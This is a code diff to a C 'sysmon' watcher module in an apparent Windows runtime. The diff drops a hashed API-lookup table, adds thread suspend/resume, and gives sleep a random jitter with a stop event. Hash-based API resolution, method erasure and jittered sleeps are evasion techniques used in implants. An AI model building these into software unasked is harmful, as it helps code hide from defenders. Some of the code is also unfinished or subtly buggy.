@@ -9,10 +9,16 @@
 #include "sysmon.h"
 #include "debug.h"
 
+#define SLEEP_REASON_FAILED     0
+#define SLEEP_REASON_TIMER      1
+#define SLEEP_REASON_STOP_EVENT 2
+
 typedef struct {
     // store options
     bool NotEraseInstruction;
 
+    SuspendThread_t          SuspendThread;
+    ResumeThread_t           ResumeThread;
     CreateWaitableTimerA_t   CreateWaitableTimerA;
     SetWaitableTimer_t       SetWaitableTimer;
     SetEvent_t               SetEvent;
@@ -65,7 +71,7 @@ static void eraseSysmonMethods(Context* context);
 static void cleanSysmon(Sysmon* sysmon);
 
 static void sm_watcher();
-static void sm_sleep(uint32 milliseconds);
+static uint sm_sleep(uint32 milliseconds);
 
 Sysmon_M* InitSysmon(Context* context)
 {
@@ -119,40 +125,15 @@ Sysmon_M* InitSysmon(Context* context)
 __declspec(noinline)
 static bool initSysmonAPI(Sysmon* sysmon, Context* context)
 {
-    // TODO remove it ???
-    typedef struct { 
-        uint hash; uint key; void* proc;
-    } winapi;
-    winapi list[] =
-#ifdef _WIN64
-    {
-        { 0xC8EB9C09DC007FB8, 0x87980B49B926FE1D }, // CreateWaitableTimerA
-        { 0x3A5329D6B69F9A72, 0x3E19B62A8A1EDA64 }, // SetWaitableTimer
-    };
-#elif _WIN32
-    {
-        { 0xA508BB38, 0x7323A00D }, // CreateWaitableTimerA
-        { 0x10F559AB, 0xA7FD156A }, // SetWaitableTimer
-    };
-#endif
-    for (int i = 0; i < arrlen(list); i++)
-    {
-        void* proc = FindAPI(list[i].hash, list[i].key);
-        if (proc == NULL)
-        {
-            return false;
-        }
-        list[i].proc = proc;
-    }
-    sysmon->CreateWaitableTimerA = list[0x00].proc;
-    sysmon->SetWaitableTimer     = list[0x01].proc;
-
-    sysmon->CreateWaitableTimerA = context->CreateWaitableTimerA;
-    sysmon->SetWaitableTimer     = context->SetWaitableTimer;
-    sysmon->SetEvent             = context->SetEvent;
-    sysmon->ReleaseMutex         = context->ReleaseMutex;
-    sysmon->WaitForSingleObject  = context->WaitForSingleObject;
-    sysmon->CloseHandle          = context->CloseHandle;
+    sysmon->SuspendThread          = context->SuspendThread;
+    sysmon->ResumeThread           = context->ResumeThread;
+    sysmon->CreateWaitableTimerA   = context->CreateWaitableTimerA;
+    sysmon->SetWaitableTimer       = context->SetWaitableTimer;
+    sysmon->SetEvent               = context->SetEvent;
+    sysmon->ReleaseMutex           = context->ReleaseMutex;
+    sysmon->WaitForSingleObject    = context->WaitForSingleObject;
+    sysmon->WaitForMultipleObjects = context->WaitForMultipleObjects;
+    sysmon->CloseHandle            = context->CloseHandle;
     return true;
 }
 
@@ -254,6 +235,7 @@ static void cleanSysmon(Sysmon* sysmon)
     {
         sysmon->CloseHandle(sysmon->hMutex);
     }
+    // TODO
     if (sysmon->CloseHandle != NULL && sysmon->hThread != NULL)
     {
 
@@ -291,42 +273,32 @@ static bool sm_unlock()
 __declspec(noinline)
 static void sm_watcher()
 {
-    Sysmon* sysmon = getSysmonPointer();
-
-    return;
-
     for (;;)
     {
-        sysmon->WaitForSingleObject(sysmon->hMutex, 1000);
-        sm_sleep(1000);
+
+        uint reason = sm_sleep(1000 + RandIntN(0, 3000));
+        switch (reason)
+        {
+        case SLEEP_REASON_TIMER:
+            // break;
+        case SLEEP_REASON_STOP_EVENT:
+            return;
+        default:
+            return;
+        }
     }
 }
 
 __declspec(noinline)
-static void sm_sleep(uint32 milliseconds)
+static uint sm_sleep(uint32 milliseconds)
 {
     Sysmon* sysmon = getSysmonPointer();
 
-    if (!sm_lock())
-    {
-        return;
-    }
-
-    CreateWaitableTimerA_t create = sysmon->CreateWaitableTimerA;
-    SetWaitableTimer_t     set    = sysmon->SetWaitableTimer;
-    WaitForSingleObject_t  wait   = sysmon->WaitForSingleObject;
-    CloseHandle_t          close  = sysmon->CloseHandle;
-
-    if (!sm_unlock())
-    {
-        return;
-    }
-
-    // simulate kernel32.Sleep
-    HANDLE hTimer = create(NULL, false, NAME_RT_TT_TIMER_SLEEP);
+    uint reason = SLEEP_REASON_FAILED;
+    HANDLE hTimer = sysmon->CreateWaitableTimerA(NULL, false, NAME_RT_TT_TIMER_SLEEP);
     if (hTimer == NULL)
     {
-        return;
+        return reason;
     }
     for (;;)
     {
@@ -335,17 +307,26 @@ static void sm_sleep(uint32 milliseconds)
             milliseconds = 10;
         }
         int64 dueTime = -((int64)milliseconds * 1000 * 10);
-        if (!set(hTimer, &dueTime, 0, NULL, NULL, true))
+        if (!sysmon->SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, true))
         {
             break;
         }
-        if (wait(hTimer, INFINITE) != WAIT_OBJECT_0)
+        HANDLE objects[] = { hTimer, sysmon->hEvent };
+        switch (sysmon->WaitForMultipleObjects(2, objects, false, INFINITE))
         {
+        case WAIT_OBJECT_0+0:
+            reason = SLEEP_REASON_TIMER;
+            break;
+        case WAIT_OBJECT_0+1:
+            reason = SLEEP_REASON_STOP_EVENT;
+            break;
+        default:
             break;
         }
         break;
     }
-    close(hTimer);
+    sysmon->CloseHandle(hTimer);
+    return reason;
 }
 
 __declspec(noinline)
@@ -370,13 +351,47 @@ bool SM_GetStatus(SM_Status* status)
 __declspec(noinline)
 errno SM_Pause()
 {
-    return NO_ERROR;
+    Sysmon* sysmon = getSysmonPointer();
+
+    if (!sm_lock())
+    {
+        return ERR_SYSMON_LOCK;
+    }
+
+    errno errno = NO_ERROR;
+    if (!sysmon->SuspendThread(sysmon->hThread))
+    {
+        errno = GetLastErrno();
+    }
+
+    if (!sm_unlock())
+    {
+        return ERR_SYSMON_UNLOCK;
+    }
+    return errno;
 }
 
 __declspec(noinline)
 errno SM_Continue()
 {
-    return NO_ERROR;
+    Sysmon* sysmon = getSysmonPointer();
+
+    if (!sm_lock())
+    {
+        return ERR_SYSMON_LOCK;
+    }
+
+    errno errno = NO_ERROR;
+    if (!sysmon->ResumeThread(sysmon->hThread))
+    {
+        errno = GetLastErrno();
+    }
+
+    if (!sm_unlock())
+    {
+        return ERR_SYSMON_UNLOCK;
+    }
+    return errno;
 }
 
 __declspec(noinline)
